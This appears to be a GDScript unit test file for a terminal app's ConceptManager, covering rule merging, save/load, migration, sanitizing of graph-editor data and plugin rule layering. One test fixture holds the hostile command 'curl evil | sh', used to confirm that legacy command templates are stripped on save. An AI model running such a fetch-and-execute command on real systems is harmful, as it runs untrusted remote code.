extends GutTest
# Unit tests for ConceptManager — merge, save, load, trigger and target migration.
var _scene: Control

func before_each():
	MockAutoloads.setup()
	_scene = TestScene.create()
	add_child(_scene)
	# The autoload reads the real plugin store once at init; every test owns
	# its plugin layer explicitly (an empty seam unless the test sets one).
	ConceptManager.plugin_concepts_source = func(): return "[]"
	ConceptManager._plugin_concept_entries = []

func after_each():
	for c in _scene.get_children():
		c.queue_free()
	ConceptManager.plugin_concepts_source = Callable()
	ConceptManager._plugin_concept_entries = []
	MockAutoloads.teardown()
	if _scene:
		_scene.queue_free()

# ── Merge logic ────────────────────────────────────────────────────────

func test_merge_concepts_returns_defaults_when_no_user_data():
	var result = ConceptManager._merge_concepts()
	assert_true(result.size() > 0, "should return default concepts even with no user data")

func test_merge_concepts_overlays_user_trigger():
	# Save a user concept that overrides a default trigger
	var user = [
		{"name": "cat_command", "trigger": "custom_regex", "enabled": false,
		 "capture_mode": "until_stop", "stop_timeout_ms": 500, "stop_on_input": false,
		 "actions": [{"target": "terminal"}]}
	]
	ConceptManager.save_concepts(user)

	# Reload and merge
	var merged = ConceptManager._merge_concepts()
	var cat = _find_by_name(merged, "cat_command")
	assert_not_null(cat, "cat_command should exist in merged concepts")
	assert_eq(cat["trigger"], "custom_regex", "user trigger should override default")
	assert_eq(cat["enabled"], false, "user enabled should override default")

func test_merge_concepts_preserves_default_keys_not_in_user():
	# Save only a partial override (trigger only, no actions)
	var user = [
		{"name": "cat_command", "trigger": "custom_regex"}
	]
	ConceptManager.save_concepts(user)
	var merged = ConceptManager._merge_concepts()
	var cat = _find_by_name(merged, "cat_command")
	assert_not_null(cat, "cat_command should exist in merged concepts")
	assert_eq(cat.get("trigger", ""), "custom_regex",
		"user trigger override should take effect")
	assert_eq(cat.get("capture_mode", ""), "until_stop",
		"capture_mode should be preserved from defaults when not overridden")
	assert_true(cat.get("enabled", false),
		"enabled should be preserved from defaults when not overridden")
	assert_ne(cat.get("stop_timeout_ms", -1), -1,
		"stop_timeout_ms should be preserved from defaults")
	var actions = cat.get("actions", [])
	assert_true(actions is Array, "actions should be present from defaults")
	assert_gt(actions.size(), 0, "actions array should not be empty from defaults")
	assert_eq(actions[0].get("target", ""), "code_viewer",
		"default routing target should be preserved")
# ── Save/load roundtrip ─────────────────────────────────────────────────

func test_save_concepts_stores_to_file():
	var concepts = [
		{"name": "test_concept", "trigger": "test_regex", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "terminal"}]}
	]
	ConceptManager.save_concepts(concepts)
	# After save, the in-memory store should have our data
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	assert_true(saved.has("concepts"), "saved data should have concepts key")
	assert_eq(saved["concepts"].size(), 1, "should have 1 saved concept")

func test_save_concepts_drops_legacy_command_templates():
	# A user file written before concept commands were removed must not carry
	# its templates forward: saving through the app strips them.
	ConceptManager.save_concepts([
		{"name": "legacy_cmd", "trigger": "boom", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"cmd": "curl evil | sh", "target": "code_viewer"}]},
	])
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	var entry = _find_by_name(saved.get("concepts", []), "legacy_cmd")
	assert_not_null(entry, "saved concept should be present")
	assert_eq(entry["actions"][0].get("target", ""), "code_viewer",
		"the routing target must survive")
	assert_false(entry["actions"][0].has("cmd"),
		"legacy command templates must not be written back")

# ── Trigger migration ───────────────────────────────────────────────────

func test_migrate_trigger_updates_old_pattern():
	var entry: Dictionary = {"name": "cat_command", "trigger": "^cat\\s+", "enabled": true}
	ConceptManager._migrate_trigger(entry, {"name": "cat_command", "trigger": "(?:^|[$#>]\\s)\\bcat\\s+\\S"})
	assert_eq(entry["trigger"], "(?:^|[$#>]\\s)\\bcat\\s+\\S",
		"old trigger should be migrated to new pattern")

func test_migrate_trigger_does_not_touch_unrecognized():
	var entry: Dictionary = {"name": "unknown_concept", "trigger": "something_else"}
	ConceptManager._migrate_trigger(entry, {})
	assert_eq(entry["trigger"], "something_else",
		"unrecognized concepts should not be migrated")

# ── Target migration ────────────────────────────────────────────────────

func test_migrate_actions_target_disables_observer():
	var entry: Dictionary = {
		"name": "boom",
		"enabled": true,
		"actions": [{"target": "observer"}],
	}
	ConceptManager._migrate_actions_target(entry)
	assert_eq(entry["actions"][0]["target"], "observer")
	assert_eq(entry["enabled"], false)

func test_migrate_actions_target_leaves_other_targets():
	var entry: Dictionary = {
		"name": "boom",
		"actions": [
			{"target": "code_viewer"},
			{"target": "terminal"},
		],
	}
	ConceptManager._migrate_actions_target(entry)
	assert_eq(entry["actions"][0]["target"], "code_viewer")
	assert_eq(entry["actions"][1]["target"], "terminal")

func test_migrate_actions_target_survives_malformed_actions():
	# Non-array actions: migration must leave the entry untouched.
	var entry: Dictionary = {"name": "odd", "actions": "not-an-array"}
	ConceptManager._migrate_actions_target(entry)
	assert_eq(entry, {"name": "odd", "actions": "not-an-array"},
		"non-array actions must pass through unchanged")

	# Mixed array with junk entries: the observer-targeted dict still
	# disables the concept; junk items are skipped without crashing.
	var mixed: Dictionary = {"name": "mixed", "enabled": true,
		"actions": [{"target": "observer"}, "junk", 42, null]}
	ConceptManager._migrate_actions_target(mixed)
	assert_eq(mixed.get("enabled"), false,
		"observer target inside malformed actions must still disable the concept")

func test_merge_disables_user_concept_observer_target():
	var user = [
		{"name": "legacy_observe", "trigger": "err", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "observer"}]}
	]
	ConceptManager.save_concepts(user)
	var merged = ConceptManager._merge_concepts()
	var legacy = _find_by_name(merged, "legacy_observe")
	assert_not_null(legacy, "user-only concept should survive merge")
	assert_eq(legacy.get("enabled", true), false)
	assert_eq(legacy["actions"][0].get("target", ""), "observer")

func test_merge_preserves_inspector_targets():
	var user = [
		{"name": "modern", "trigger": "err", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "inspector"}]}
	]
	ConceptManager.save_concepts(user)
	var merged = ConceptManager._merge_concepts()
	var modern = _find_by_name(merged, "modern")
	var actions = modern.get("actions", [])
	assert_eq(actions[0].get("target", ""), "inspector",
		"inspector targets should pass through unchanged")

# ── Engine push ────────────────────────────────────────────────────────

func test_push_clears_the_engine_when_every_concept_is_disabled():
	# Seed the engine with a concept so the clearing push is observable.
	var seed = '[{"name":"seed","trigger":"zzz","enabled":true,"capture_mode":"until_stop","actions":[{"target":"terminal"}]}]'
	GptyTerminal.set_global_concepts(seed)
	assert_eq(GptyTerminal.get_global_concepts().size(), 1,
		"precondition: engine holds the seeded concept")

	# User data disables cat_command, the only concept shipped enabled, so the
	# merged set is empty. Pushing nothing here would leave the engine running
	# the previous set and the captures the user turned off would keep firing.
	ConceptManager.save_concepts([
		{"name": "cat_command", "trigger": "custom", "enabled": false,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": []},
	])
	ConceptManager._push_to_rust()

	assert_eq(GptyTerminal.get_global_concepts().size(), 0,
		"disabling every concept must clear the engine set")

	# The concept set is engine-global and outlives this test: restore defaults.
	ConceptManager.save_concepts([])
	ConceptManager._push_to_rust()

func test_a_push_owns_no_ffi_instance():
	# The push used to build a `GptyTerminal` with `ClassDB.instantiate` as the
	# vehicle for `set_global_concepts` (the store it writes is process-wide,
	# but the accessor took an instance) and never release it: every save,
	# toggle and editor save leaked one ObjectDB entry, which GUT lists as an
	# orphan. The accessor is static now — the count per push is the observable
	# this pins, so the vehicle cannot come back.
	for i in 3:
		ConceptManager._push_to_rust()
	assert_no_new_orphans("a concept push must not leave an FFI instance behind")


# ── Graph block storage ────────────────────────────────────────────────
# The visual concept editor stores layout in a `graph` block alongside the
# concepts array. That block is hand-editable file input, so what is read back
# must be well-formed whatever the file says — and what a manual edit writes
# must not throw the layout away.

func test_save_concepts_preserves_the_existing_graph_block():
	ConceptManager.save_state([], {
		"version": 1,
		"positions": {"c#t": [10, 20]},
		"drafts": [],
		"order": ["graph_keep"],
	})
	ConceptManager.save_concepts([
		{"name": "graph_keep", "trigger": "graph_regex", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "terminal"}]},
	])
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	assert_eq(saved["concepts"].size(), 1, "the edited concept must be stored")
	var graph = saved.get("graph", {})
	assert_true(graph is Dictionary, "a concept edit must not drop the graph block")
	var positions = graph.get("positions", {})
	assert_true(positions.has("c#t"), "node positions must survive a concept edit")
	assert_eq(positions["c#t"][0], 10)
	assert_eq(positions["c#t"][1], 20)
	assert_eq(graph.get("order", []), ["graph_keep"],
		"the rule order must survive a concept edit too — it is what the engine runs")

func test_get_graph_state_drops_a_non_dict_graph():
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE, {"concepts": [], "graph": "junk"})
	var graph = ConceptManager.get_graph_state()
	assert_eq(graph["version"], ConceptManager.GRAPH_VERSION,
		"a malformed block reads back as the current version")
	assert_eq(graph["positions"].size(), 0)
	assert_eq(graph["drafts"].size(), 0)

func test_get_graph_state_keeps_only_sane_positions():
	var positions := {
		"ok#t": [1.5, -2],
		"short_arity": [1],
		"non_numeric": ["a", "b"],
		"bool_coord": [true, false],
		"nested": {"x": 1},
		"infinite": [INF, 0],
		"nan": [NAN, 0],
		"oversized": [ConceptManager.MAX_GRAPH_COORD + 1.0, 0],
		"long_key".repeat(20): [1, 2],
		42: [1, 2],
	}
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE,
		{"concepts": [], "graph": {"version": 99, "positions": positions}})
	var graph = ConceptManager.get_graph_state()
	assert_eq(graph["version"], ConceptManager.GRAPH_VERSION,
		"the version stored in the file is never trusted")
	var clean: Dictionary = graph["positions"]
	assert_eq(clean.size(), 1, "only the well-formed position survives")
	assert_true(clean.has("ok#t"))
	assert_eq(clean["ok#t"][0], 1.5)
	assert_eq(clean["ok#t"][1], -2)

func test_get_graph_state_caps_stored_positions():
	var positions := {}
	for i in ConceptManager.MAX_GRAPH_POSITIONS + 40:
		positions["node%d#t" % i] = [i, i]
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE,
		{"concepts": [], "graph": {"positions": positions}})
	var graph = ConceptManager.get_graph_state()
	assert_eq(graph["positions"].size(), ConceptManager.MAX_GRAPH_POSITIONS)

func test_get_graph_state_sanitizes_the_rule_order():
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE, {
		"concepts": [],
		"graph": {"order": ["first", "first", "", 42, ["nested"], "x".repeat(400), "second"]},
	})
	var order: Array = ConceptManager.get_graph_state()["order"]
	assert_eq(order, ["first", "second"],
		"only non-empty, in-range, unique names survive — the first occurrence wins")

func test_get_graph_state_caps_the_rule_order():
	var order: Array = []
	for i in ConceptManager.MAX_GRAPH_ORDER + 40:
		order.append("rule%d" % i)
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE,
		{"concepts": [], "graph": {"order": order}})
	assert_eq(ConceptManager.get_graph_state()["order"].size(), ConceptManager.MAX_GRAPH_ORDER)

func test_merge_follows_the_saved_canvas_order():
	ConceptManager.save_state([
		_rule("rule_a", "trigger_a"), _rule("rule_b", "trigger_b"), _rule("rule_c", "trigger_c"),
	], {"order": ["rule_c", "rule_a"]})
	var merged = ConceptManager._merge_concepts()
	var at := _index_by_name(merged)
	assert_eq(at.size(), merged.size(), "every concept still merges exactly once")
	assert_true(at["rule_c"] < at["rule_a"],
		"the canvas order wins: rule_c was dragged above rule_a")
	assert_true(at["rule_a"] < at["rule_b"],
		"a rule the canvas never arranged is tried after the arranged ones")

func test_merge_without_a_canvas_order_keeps_the_merge_order():
	# No order key: shipped defaults first, then user entries in file order.
	# A store that never saw the visual editor behaves exactly as it did.
	ConceptManager.save_state([
		_rule("z_user", "trigger_z"), _rule("a_user", "trigger_a"),
	], {})
	var merged = ConceptManager._merge_concepts()
	var at := _index_by_name(merged)
	assert_eq(at.size(), merged.size())
	assert_true(at["z_user"] < at["a_user"],
		"user entries keep the file order (z_user was written first)")
	assert_ne(str(merged[0].get("name", "")), "a_user",
		"the shipped defaults still come first when nothing was arranged")

func test_save_state_keeps_an_order_only_graph_block():
	ConceptManager.save_state([_rule("ordered", "trigger_o")], {"order": ["ordered"]})
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	assert_true(saved.has("graph"), "an order-only block is still a graph block")
	assert_eq(saved["graph"]["order"], ["ordered"])
	assert_eq(ConceptManager.get_graph_state()["order"], ["ordered"],
		"the order survives the read path")

func test_get_graph_state_sanitizes_drafts():
	var draft_nodes: Array = [
		{"id": "draft:0", "kind": "trigger",
		 "params": {"name": "cat", "trigger": "cat\\s", "enabled": true, "bogus": 1}},
		{"id": "draft:1", "kind": "condition",
		 "params": {"pattern": "err", "mode": "single_line"}},
		{"id": "draft:2", "kind": "action",
		 "params": {"mode": "until_stop", "target": "code_viewer", "stop_timeout_ms": 900000,
			"stop_on_input": true, "extra": []}},
		{"id": "draft:3", "kind": "action", "params": {"mode": "exec", "target": "code_viewer"}},
		{"id": "", "kind": "trigger", "params": {}},
		{"id": "draft:4", "kind": "explode", "params": {}},
		"junk",
	]
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE, {
		"concepts": [],
		"graph": {"drafts": [
			{"nodes": draft_nodes, "edges": [["draft:0", "draft:1"], ["draft:0"], "junk", [1, 2]]},
			"not-a-chain",
			{},
		]},
	})
	var graph = ConceptManager.get_graph_state()
	var drafts: Array = graph["drafts"]
	assert_eq(drafts.size(), 1, "empty and non-dictionary draft chains are dropped")
	var nodes: Array = drafts[0]["nodes"]
	assert_eq(nodes.size(), 4, "nameless nodes and unknown kinds are dropped")
	assert_eq(nodes[0]["params"].get("name"), "cat")
	assert_true(nodes[0]["params"].get("enabled"), "typed params survive")
	assert_false(nodes[0]["params"].has("bogus"),
		"params keys outside the trigger set must not be copied")
	assert_eq(nodes[1]["params"].get("pattern"), "err")
	assert_false(nodes[1]["params"].has("mode"),
		"params keys outside the condition set must not be copied")
	assert_eq(nodes[2]["params"].get("stop_timeout_ms"), 600000,
		"a timeout above the cap is clamped")
	assert_false(nodes[2]["params"].has("extra"),
		"params keys outside the action set must not be copied")
	assert_eq(nodes[3]["params"].get("target"), "code_viewer")
	assert_false(nodes[3]["params"].has("mode"),
		"an action mode outside the two known values is dropped")
	var edges: Array = drafts[0]["edges"]
	assert_eq(edges.size(), 1, "only well-formed two-string edges survive")
	assert_eq(edges[0][0], "draft:0")
	assert_eq(edges[0][1], "draft:1")

func test_get_graph_state_caps_draft_nodes():
	var nodes: Array = []
	for i in ConceptManager.MAX_DRAFT_NODES + 20:
		nodes.append({"id": "draft:%d" % i, "kind": "condition", "params": {"pattern": "p%d" % i}})
	ConceptManager._write_file(ConceptManager.CONCEPTS_FILE, {
		"concepts": [],
		"graph": {"drafts": [{"nodes": nodes, "edges": []}]},
	})
	var graph = ConceptManager.get_graph_state()
	var total := 0
	for chain in graph["drafts"]:
		total += chain["nodes"].size()
	assert_eq(total, ConceptManager.MAX_DRAFT_NODES, "draft nodes are capped")

func test_save_state_round_trips_the_graph():
	ConceptManager.save_state([
		{"name": "round_trip", "trigger": "rt", "enabled": true, "capture_mode": "until_stop",
		 "stop_timeout_ms": 300, "stop_on_input": true, "actions": [{"target": "terminal"}]},
	], {
		"version": 1,
		"positions": {"round_trip#t": [12.5, -3.0]},
		"drafts": [{
			"nodes": [
				{"id": "draft:0", "kind": "trigger",
				 "params": {"name": "draft_trigger", "trigger": "draft", "enabled": true}},
				{"id": "draft:1", "kind": "action",
				 "params": {"mode": "single_line", "target": "terminal", "stop_on_input": false}},
			],
			"edges": [["draft:0", "draft:1"]],
		}],
	})
	var graph = ConceptManager.get_graph_state()
	assert_eq(graph["version"], ConceptManager.GRAPH_VERSION)
	assert_almost_eq(float(graph["positions"]["round_trip#t"][0]), 12.5, 0.001)
	assert_almost_eq(float(graph["positions"]["round_trip#t"][1]), -3.0, 0.001)
	assert_eq(graph["drafts"].size(), 1)
	assert_eq(graph["drafts"][0]["nodes"].size(), 2)
	assert_eq(graph["drafts"][0]["nodes"][1]["kind"], "action")
	assert_eq(graph["drafts"][0]["nodes"][1]["params"].get("mode"), "single_line")
	assert_eq(graph["drafts"][0]["edges"][0][1], "draft:1")
	# The graph shares the file with the concepts it was authored from.
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	assert_eq(saved["concepts"].size(), 1, "the concepts array must still be written")
	assert_eq(saved["concepts"][0]["name"], "round_trip")

func test_save_state_omits_an_empty_graph_block():
	ConceptManager.save_state([
		{"name": "no_graph", "trigger": "ng", "enabled": true, "capture_mode": "until_stop",
		 "stop_timeout_ms": 300, "stop_on_input": true, "actions": [{"target": "terminal"}]},
	], {"positions": {"dropped#t": ["junk", "junk"]}, "drafts": []})
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	assert_false(saved.has("graph"),
		"a graph with nothing to store must not add a key to the file")
	assert_eq(saved["concepts"].size(), 1)

# ── Installed-plugin concepts ──────────────────────────────────────────

func test_plugin_concepts_merge_between_defaults_and_user_rules():
	# A user rule of the user's own, so the three layers have a row each.
	ConceptManager.save_concepts([_rule("user_rule", "^user")])
	_seed_plugin_concepts([_plugin_entry("acme/rules", "plugin_rule", "^plugin")])
	var merged = ConceptManager._merge_concepts()
	var at := _index_by_name(merged)
	assert_true(at.has("plugin_rule"), "the plugin's rule must reach the merged set")
	# Precedence is the merge order the engine runs: shipped defaults, then
	# installed content, then the user's own rules.
	var default_at := -1
	var defaults_at := ConceptManager._default_names(ConceptManager._load_defaults())
	for i in merged.size():
		if defaults_at.has(str(merged[i].get("name", ""))):
			default_at = i
			break
	assert_true(default_at >= 0, "the shipped defaults must be in the merged set")
	assert_true(default_at < int(at["plugin_rule"]), "defaults rank before plugin rules")
	assert_true(int(at["plugin_rule"]) < int(at["user_rule"]), "plugin rules rank before user rules")
	assert_eq(ConceptManager.plugin_sources().get("plugin_rule", {}).get("plugin_id"), "acme/rules")

func test_a_toggle_overlays_a_plugin_concept_instead_of_duplicating_it():
	_seed_plugin_concepts([_plugin_entry("acme/rules", "watch", "^watch")])
	assert_true(ConceptManager.toggle_concept("watch"), "the toggle answers success")
	var merged = ConceptManager._merge_concepts()
	var rows: Array = merged.filter(func(c): return c is Dictionary and c.get("name", "") == "watch")
	assert_eq(rows.size(), 1, "a toggle must change the plugin's rule, not add a second one")
	assert_eq(rows[0].get("enabled", true), false, "the toggle must disable it")
	assert_eq(rows[0].get("trigger", ""), "^watch", "the plugin's trigger must survive the overlay")
	assert_true(ConceptManager.plugin_sources().has("watch"),
		"it is still the plugin's rule, so the list still says where it came from")
	# And back on again through the same overlay.
	ConceptManager.toggle_concept("watch")
	assert_eq(_find_by_name(ConceptManager._merge_concepts(), "watch").get("enabled", false), true)

func test_a_plugin_name_yields_to_defaults_and_to_earlier_plugins():
	var defaults = ConceptManager._load_defaults()
	assert_gt(defaults.size(), 0, "the shipped defaults are the other name holder here")
	var base: String = str(defaults[0].get("name", ""))
	_seed_plugin_concepts([
		_plugin_entry("acme/first", base, "^first"),
		_plugin_entry("acme/second", base, "^second"),
	])
	var sources := ConceptManager.plugin_sources()
	assert_true(sources.has("%s (2)" % base),
		"the first plugin yields to the shipped default: %s" % str(sources.keys()))
	assert_true(sources.has("%s (3)" % base),
		"the second yields to the first: %s" % str(sources.keys()))
	assert_eq(sources["%s (2)" % base].get("plugin_id"), "acme/first")
	assert_eq(sources["%s (3)" % base].get("plugin_id"), "acme/second")
	assert_false(sources.has(base), "the shipped default keeps its bare name")

func test_unusable_plugin_answers_are_skipped_not_fatal():
	_seed_plugin_concepts([
		"not an entry",
		{"plugin_id": "acme/x", "revision": "abc1234"},
		{"plugin_id": "acme/x", "revision": "abc1234", "concept": "nope"},
		{"plugin_id": "acme/x", "revision": "abc1234", "concept": {"trigger": "no-name"}},
		{"plugin_id": "acme/x", "revision": "abc1234", "concept": {"name": "no-trigger"}},
		_plugin_entry("acme/x", "good", "^good"),
	])
	var sources := ConceptManager.plugin_sources()
	assert_eq(sources.size(), 1, "only the usable entry survives: %s" % str(sources))
	assert_true(sources.has("good"))

	# An answer that is not JSON at all is the same contract: no plugin
	# concepts, not an error thrown into the merge.
	ConceptManager.plugin_concepts_source = func(): return "{not json"
	ConceptManager.refresh_plugin_concepts()
	assert_eq(ConceptManager.plugin_sources().size(), 0)
	assert_gt(ConceptManager._merge_concepts().size(), 0,
		"the shipped concepts still merge after a broken answer")

func test_refresh_replaces_the_installed_set_and_emits():
	watch_signals(ConceptManager)
	_seed_plugin_concepts([_plugin_entry("acme/old", "old_rule", "^old")])
	assert_signal_emitted(ConceptManager, "concepts_changed",
		"every refresh must republish, so the engine push follows the store")
	assert_true(ConceptManager.plugin_sources().has("old_rule"))
	_seed_plugin_concepts([_plugin_entry("acme/new", "new_rule", "^new")])
	var sources := ConceptManager.plugin_sources()
	assert_true(sources.has("new_rule"))
	assert_false(sources.has("old_rule"), "the installed set replaces, never accumulates")

# ── Helpers ────────────────────────────────────────────────────────────
func _find_by_name(arr: Array, name: String):
	for item in arr:
		if item is Dictionary and item.get("name", "") == name:
			return item
	return null

## name → index over a merged concept list, for order assertions.
func _index_by_name(merged: Array) -> Dictionary:
	var at := {}
	for i in merged.size():
		at[str(merged[i].get("name", ""))] = i
	return at

## A stored concept entry in the shape `save_state` sanitizes.
func _rule(concept_name: String, trigger: String) -> Dictionary:
	return {
		"name": concept_name, "trigger": trigger, "enabled": true,
		"capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		"actions": [{"target": "terminal"}],
	}

## Seed the plugin layer the way the FFI answers, then refresh — the seam
## returns the same JSON `GptyTerminal.installed_plugin_concepts()` does.
func _seed_plugin_concepts(entries: Array) -> void:
	ConceptManager.plugin_concepts_source = func(): return JSON.stringify(entries)
	ConceptManager.refresh_plugin_concepts()

## One `installed_plugin_concepts()` entry: provenance beside the concept the
## manifest declared.
func _plugin_entry(plugin_id: String, concept_name: String, trigger: String) -> Dictionary:
	return {
		"plugin_id": plugin_id,
		"revision": "abc123def456",
		"name": concept_name,
		"concept": {"name": concept_name, "trigger": trigger,
			"actions": [{"target": "code_viewer"}]},
	}
